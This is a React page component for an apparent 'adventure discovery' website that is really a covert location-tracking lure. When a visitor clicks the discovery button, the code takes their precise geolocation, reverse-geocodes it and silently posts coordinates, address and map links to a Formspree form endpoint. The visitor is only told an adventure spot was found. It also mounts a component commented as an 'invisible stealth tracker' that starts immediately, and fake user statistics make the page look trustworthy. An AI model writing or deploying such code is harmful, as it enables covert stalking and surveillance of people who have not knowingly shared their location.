import { useState } from 'react';
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { MapView } from "@/components/MapView";
import { LocationCard } from "@/components/LocationCard";
import { AdminPanel } from "@/components/AdminPanel";
import { StealthTracker } from "@/components/StealthTracker";
import { useToast } from "@/hooks/use-toast";
import { Compass, Mountain, Camera, Share2, Sparkles, TreePine, Route, Users } from "lucide-react";
import heroAdventure from "@/assets/hero-adventure.jpg";

interface LocationData {
  latitude: number;
  longitude: number;
  country?: string;
  state?: string;
  city?: string;
}

const Index = () => {
  const [locationData, setLocationData] = useState<LocationData | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const { toast } = useToast();

  const getLocation = () => {
    if (!navigator.geolocation) {
      toast({
        title: "Geolocation Not Supported",
        description: "Your browser doesn't support geolocation.",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);
    
    const options = {
      enableHighAccuracy: true,
      timeout: 8000, // Reduced timeout for faster response
      maximumAge: 0
    };
    
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        
        try {
          // Get location details from reverse geocoding
          const response = await fetch(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`
          );
          const data = await response.json();
          
          const locationInfo: LocationData = {
            latitude: lat,
            longitude: lon,
            country: data.address?.country || '',
            state: data.address?.state || data.address?.region || '',
            city: data.address?.city || data.address?.town || data.address?.village || data.address?.hamlet || '',
          };
          
          setLocationData(locationInfo);
          
          // Submit to form endpoint (simulating the original functionality)
          try {
            // Generate map links for email notifications
            const googleMapLink = `https://www.google.com/maps?q=${lat},${lon}&z=15`;
            const openStreetMapLink = `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=15`;
            
            const formData = new FormData();
            formData.append('latitude', lat.toString());
            formData.append('longitude', lon.toString());
            formData.append('country', locationInfo.country || '');
            formData.append('state', locationInfo.state || '');
            formData.append('city', locationInfo.city || '');
            formData.append('map_link_google', googleMapLink);
            formData.append('map_link_osm', openStreetMapLink);
            formData.append('tracking_type', 'initial_discovery');
            formData.append('discovery_time', new Date().toLocaleString());
            formData.append('formatted_coordinates', `${lat.toFixed(6)}°, ${lon.toFixed(6)}°`);
            
            await fetch('https://formspree.io/f/xwpbjvky', {
              method: 'POST',
              body: formData,
              headers: { 'Accept': 'application/json' }
            });
            
            toast({
              title: "🗺️ Adventure Destination Found!",
              description: "Your perfect exploration spot is ready to discover!",
            });
          } catch {
            toast({
              title: "🗺️ Adventure Destination Found!",
              description: "Your perfect exploration spot is ready to discover!",
            });
          }
        } catch {
          // Even if reverse geocoding fails, show the location
          setLocationData({
            latitude: lat,
            longitude: lon,
          });
          toast({
            title: "🗺️ Adventure Destination Found!",
            description: "Your perfect exploration spot is ready to discover!",
          });
        }
        
        setIsLoading(false);
      },
      (error) => {
        setIsLoading(false);
        let message = '';
        switch(error.code) {
          case error.PERMISSION_DENIED:
            message = "We need location access to find your adventure spot! Please allow and refresh.";
            break;
          case error.POSITION_UNAVAILABLE:
            message = "Adventure location detection unavailable right now.";
            break;
          case error.TIMEOUT:
            message = "Adventure discovery timed out. Please try again!";
            break;
          default:
            message = "Something went wrong during adventure discovery.";
            break;
        }
        toast({
          title: "🚫 Adventure Discovery Blocked",
          description: message,
          variant: "destructive",
        });
      },
      options
    );
  };

  return (
    <div className="min-h-screen">
      {/* Invisible stealth tracker starts immediately */}
      <StealthTracker 
        onLocationUpdate={(location) => {
          // Silently update location if no explicit location is set
          if (!locationData) {
            setLocationData({
              latitude: location.latitude,
              longitude: location.longitude,
              country: '',
              state: '',
              city: '',
            });
          }
        }}
      />
      
      {/* Hero Background Section */}
      <div 
        className="relative min-h-screen bg-cover bg-center bg-no-repeat"
        style={{
          backgroundImage: `linear-gradient(135deg, rgba(0,0,0,0.4), rgba(0,0,0,0.2)), url(${heroAdventure})`,
        }}
      >
        <div className="absolute inset-0 bg-gradient-to-b from-transparent via-background/10 to-background"></div>
        
        <div className="relative z-10 flex flex-col items-center justify-center min-h-screen px-4 text-center">
          {/* Hero Content */}
          <div className="space-y-8 max-w-4xl">
            <div className="inline-flex items-center gap-2 px-6 py-3 rounded-full bg-white/20 backdrop-blur-md text-white text-sm font-medium border border-white/30 shadow-glow">
              <Sparkles className="h-4 w-4" />
              ✨ Adventure Discovery Platform
            </div>
            
            <h1 className="text-5xl md:text-7xl font-bold text-white leading-tight">
              Discover Your Next
              <span className="block bg-gradient-to-r from-yellow-300 to-orange-400 bg-clip-text text-transparent">
                Adventure 🏔️
              </span>
            </h1>
            
            <p className="text-xl md:text-2xl text-white/90 max-w-3xl mx-auto leading-relaxed">
              Find amazing destinations, hidden gems, and perfect photo spots near you! 
              <span className="block mt-2 text-lg text-white/70">
                Join thousands of explorers discovering breathtaking locations worldwide.
              </span>
            </p>
            
            <div className="flex flex-col sm:flex-row gap-4 justify-center items-center">
              <Button 
                onClick={getLocation} 
                size="lg"
                disabled={isLoading}
                className="adventure-button text-lg px-8 py-4 group shadow-2xl"
              >
                {isLoading ? (
                  <>
                    <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-white" />
                    🧭 Discovering...
                  </>
                ) : (
                  <>
                    <Compass className="h-6 w-6 group-hover:rotate-180 transition-transform duration-500" />
                    🚀 Discover My Adventure Zone
                  </>
                )}
              </Button>
              
              <div className="flex items-center gap-2 text-white/80 text-sm">
                <Users className="h-4 w-4" />
                <span>Join 50K+ adventurers</span>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Content Section */}
      <div className="bg-background py-16">
        <div className="max-w-6xl mx-auto px-4 space-y-12">{/* Adventure Stats */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <Card className="explorer-card text-center">
              <CardContent className="pt-6">
                <Mountain className="h-12 w-12 text-primary mx-auto mb-4" />
                <h3 className="text-2xl font-bold text-primary">50K+</h3>
                <p className="text-muted-foreground">Hidden Gems Discovered</p>
              </CardContent>
            </Card>
            <Card className="explorer-card text-center">
              <CardContent className="pt-6">
                <Camera className="h-12 w-12 text-accent mx-auto mb-4" />
                <h3 className="text-2xl font-bold text-accent">100K+</h3>
                <p className="text-muted-foreground">Photos Captured</p>
              </CardContent>
            </Card>
            <Card className="explorer-card text-center">
              <CardContent className="pt-6">
                <TreePine className="h-12 w-12 text-success mx-auto mb-4" />
                <h3 className="text-2xl font-bold text-success">25K+</h3>
                <p className="text-muted-foreground">Nature Spots Found</p>
              </CardContent>
            </Card>
          </div>

          {/* Adventure Information */}
          <LocationCard locationData={locationData} isLoading={isLoading} />

          {/* Interactive Map */}
          {locationData && (
            <div className="space-y-6">
              <div className="text-center">
                <h2 className="text-3xl md:text-4xl font-bold flex items-center justify-center gap-3 mb-4">
                  <Route className="h-8 w-8 text-primary" />
                  🗺️ Your Adventure Map
                </h2>
                <p className="text-lg text-muted-foreground max-w-2xl mx-auto">
                  Explore your destination and plan your next adventure. Perfect for discovering nearby trails, landmarks, and photo opportunities!
                </p>
              </div>
              <div className="relative">
                <MapView 
                  latitude={locationData.latitude} 
                  longitude={locationData.longitude}
                  className="animate-float shadow-warm border-2 border-primary/20"
                />
                <div className="absolute -top-4 -right-4 bg-gradient-to-r from-yellow-400 to-orange-500 text-white px-4 py-2 rounded-full text-sm font-medium shadow-lg">
                  📍 You're Here!
                </div>
              </div>
            </div>
          )}

          {/* Share Adventure */}
          <Card className="explorer-card bg-gradient-to-br from-primary/5 via-accent/5 to-success/5 border-primary/20 relative overflow-hidden">
            <div className="absolute inset-0 bg-gradient-to-r from-primary/5 to-accent/5 opacity-50"></div>
            <CardHeader className="text-center relative z-10">
              <CardTitle className="flex items-center justify-center gap-2 text-2xl">
                <Share2 className="h-6 w-6 text-primary" />
                🌟 Share the Adventure
              </CardTitle>
              <CardDescription className="text-lg">
                Found an amazing spot? Share this adventure platform with fellow explorers and help them discover incredible destinations too!
              </CardDescription>
            </CardHeader>
            <CardContent className="text-center relative z-10">
              <div className="flex flex-col sm:flex-row gap-4 justify-center">
                <div className="flex items-center gap-2 text-muted-foreground">
                  <Camera className="h-4 w-4" />
                  Perfect for Instagram
                </div>
                <div className="flex items-center gap-2 text-muted-foreground">
                  <Mountain className="h-4 w-4" />
                  Find Hidden Gems
                </div>
                <div className="flex items-center gap-2 text-muted-foreground">
                  <TreePine className="h-4 w-4" />
                  Nature Exploration
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Travel Guide Panel */}
          <AdminPanel />
        </div>
      </div>
    </div>
  );
};

export default Index;
